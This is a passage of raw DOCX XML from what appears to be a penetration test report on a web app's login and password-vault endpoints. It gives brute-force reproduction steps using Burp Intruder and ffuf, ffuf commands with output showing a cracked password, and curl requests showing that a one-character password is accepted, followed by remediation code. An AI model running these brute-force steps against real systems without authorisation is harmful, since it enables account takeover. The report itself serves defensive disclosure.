        <w:t>Rate limit headers provide false sense of security</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CVSS v3.1 Score</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Score:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 7.5 (High)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vector:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implement Stricter Rate Limiting:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>5 failed attempts per 15 minutes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Progressive delays (exponential backoff)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Account lockout after 10 failed attempts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Add Account Lockout Mechanism:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   if (failedAttempts &gt;= 10) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">     lockAccount(username, 30 * 60 * 1000); // 30 minute lockout</w:t>
        <w:br/>
        <w:t xml:space="preserve">   }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implement CAPTCHA After 3 Failed Attempts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Add IP-based Rate Limiting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots and Reproduction Steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recreation Steps:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Login Brute Force:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Setup Burp Suite Intruder or ffuf for POST /login endpoint.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Configure payload on the password field with a wordlist of common passwords (100+ entries).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Set Burp Intruder to send requests with high thread count (40+) or use ffuf with default threading.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Start the attack with the same session cookie.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Monitor responses: all requests return 200 OK regardless of count.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Identify successful login by response size difference (46 bytes vs 50 bytes for invalid credentials).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Confirm password cracked after 101 attempts with no rate limiting enforcement.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vault Unlock Brute Force:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Setup Burp Suite Intruder or ffuf for POST /vault/unlock endpoint.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Configure payload on the password field (form-data) with a wordlist of common passwords (100+ entries).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Set Burp Intruder to send requests with high thread count (40+) or use ffuf with default threading.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Start the attack with the same session cookie.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Monitor responses: all requests return 200 OK regardless of count.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Identify successful unlock by response size difference (43 bytes vs 48 bytes for invalid credentials).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Confirm vault password cracked after 101 attempts with no rate limiting enforcement.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Burp Intruder setup for brute force login attempts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ffuf results showing all login payloads returning 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 3:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Successful login password "csrfhacked123" with Size: 46 response</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 4:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ffuf results showing all vault unlock payloads returning 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 5:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Successful vault unlock password with Size: 43 response</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Command Output:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Login Brute Force</w:t>
        <w:br/>
        <w:t>ffuf -request login_brute.txt -w brute_payload.txt -u http://10.0.0.10/login</w:t>
        <w:br/>
        <w:t>csrfhacked123           [Status: 200, Size: 46, Words: 2, Lines: 1, Duration: 1229ms]</w:t>
        <w:br/>
        <w:br/>
        <w:t># Vault Unlock Brute Force</w:t>
        <w:br/>
        <w:t>ffuf -request vault_brute.txt -w brute_payload.txt -u http://10.0.0.10/vault/unlock</w:t>
        <w:br/>
        <w:t>csrfhacked123           [Status: 200, Size: 43, Words: 2, Lines: 1, Duration: 1207ms]</w:t>
        <w:br/>
        <w:br/>
        <w:t># All other payloads return Size: 50 (login) or Size: 48 (vault unlock) - Invalid credentials</w:t>
        <w:br/>
        <w:t># Rate limit headers present but no blocking occurs on either endpoint</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>MEDIUM PRIORITY FINDINGS (Weaknesses)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 7: Weak Password Validation - No Complexity Enforcement on Password Change</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HIGH (CVSS 7.5)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Status:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CONFIRMED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The password change endpoints (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>POST /account/update</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for account password and vault password reset) implement flawed validation logic. While they correctly validate that the current password matches before allowing an update, they fail to enforce password complexity requirements on the new password. This allows users to set extremely weak passwords (single characters like "1") without any complexity validation on both account and vault passwords.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerability Details</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Endpoints:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> POST /account/update (account password), Vault password reset (vault password)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Issue:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> No complexity validation on new password; only checks if current and new passwords match</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Authentication Required:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Yes (session-based)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Impact:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Users can set trivially weak passwords on both account and vault despite authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Proof of Concept</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Scenario 1: Attempt with different passwords (current ≠ new) - REJECTED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://10.0.0.10/account/update \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=[session]" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"password":"csrfhacked123","updatedPassword":"1","updateField":"account"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Response:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{"success":false,"message":"Passwords do not match."}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Scenario 2: Same weak password (current = new) - ACCEPTED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://10.0.0.10/account/update \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=[session]" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"password":"1","updatedPassword":"1","updateField":"account"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Response:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{"success":true,"message":"Account password updated successfully!"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Scenario 3: Vault password reset with same weak password (current = new) - ACCEPTED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://10.0.0.10/account/update \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=[session]" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"password":"1","updatedPassword":"1","updateField":"vault"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Response:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{"success":true,"message":"Vault password updated successfully!"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Both account and vault password endpoints validate that current and new passwords match (must be identical), but never enforce complexity requirements. When both are set to the same weak password "1", the update succeeds on both endpoints. This allows users to maintain or set trivially weak passwords without any complexity validation on either account or vault passwords.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Impact</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Users can set trivially weak passwords (single characters)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Accounts become vulnerable to brute force attacks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Security posture degraded by poor password policy enforcement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Inconsistent security controls between registration and password change</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CVSS v3.1 Score</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Score:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 7.5 (High)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vector:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Enforce Password Complexity on Update:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   app.post('/account/update', (req, res) =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">     // Verify current password</w:t>
        <w:br/>
        <w:t xml:space="preserve">     if (!verifyPassword(req.body.password, user.password)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">       return res.status(400).json({ success: false, message: "Current password incorrect" });</w:t>
        <w:br/>
        <w:t xml:space="preserve">     }</w:t>
        <w:br/>
        <w:t xml:space="preserve">     </w:t>
        <w:br/>
        <w:t xml:space="preserve">     // Validate new password complexity</w:t>
        <w:br/>
        <w:t xml:space="preserve">     if (!isStrongPassword(req.body.updatedPassword)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">       return res.status(400).json({ success: false, message: "New password does not meet complexity requirements" });</w:t>
        <w:br/>
        <w:t xml:space="preserve">     }</w:t>
        <w:br/>
        <w:t xml:space="preserve">     </w:t>
        <w:br/>
        <w:t xml:space="preserve">     // Update password</w:t>
        <w:br/>
        <w:t xml:space="preserve">     updatePassword(user.id, req.body.updatedPassword);</w:t>
        <w:br/>
        <w:t xml:space="preserve">   });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implement Consistent Password Policy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Apply same complexity rules to registration and password change</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Minimum 8 characters, uppercase, lowercase, numbers, special characters</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Clear Error Messages:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Distinguish between "Current password incorrect" and "New password too weak"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Add Password Strength Validation:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Client-side validation for immediate feedback</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Server-side validation for security</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots and Reproduction Steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recreation Steps:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Scenario 1: Account Password - Different passwords (Rejected)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Login to the application with valid credentials (e.g., password: csrfhacked123).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Navigate to account settings.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Use Burp Suite to intercept POST /account/update request.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">4. Send request: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{"password":"csrfhacked123","updatedPassword":"1","updateField":"account"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Observe error response: "Passwords do not match."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Scenario 2: Account Password - Same weak password (Accepted)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Login to the application with weak password (e.g., password: 1).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Navigate to account settings.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Use Burp Suite to intercept POST /account/update request.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">4. Send request: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{"password":"1","updatedPassword":"1","updateField":"account"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Observe success response: "Account password updated successfully!"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Verify weak password persists by logging out and logging in with password "1".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Scenario 3: Vault Password - Same weak password (Accepted)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Login to the application with valid credentials.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Navigate to vault settings or password change section.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Use Burp Suite to intercept POST /account/update request.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">4. Send request: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{"password":"1","updatedPassword":"1","updateField":"vault"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Observe success response: "Vault password updated successfully!"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Verify weak vault password by accessing vault with password "1".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Scenario 1 Screenshots:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Burp intercept - POST /account/update with different passwords (csrfhacked123 ≠ 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Error response - "Passwords do not match."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Scenario 2 Screenshots:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 3:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Burp intercept - POST /account/update with same weak password (1 = 1, updateField: account)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 4:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Success response - "Account password updated successfully!"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 5:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Login with weak password "1" succeeds</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Scenario 3 Screenshots:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 6:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Burp intercept - POST /account/update with same weak password (1 = 1, updateField: vault)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 7:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Success response - "Vault password updated successfully!"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
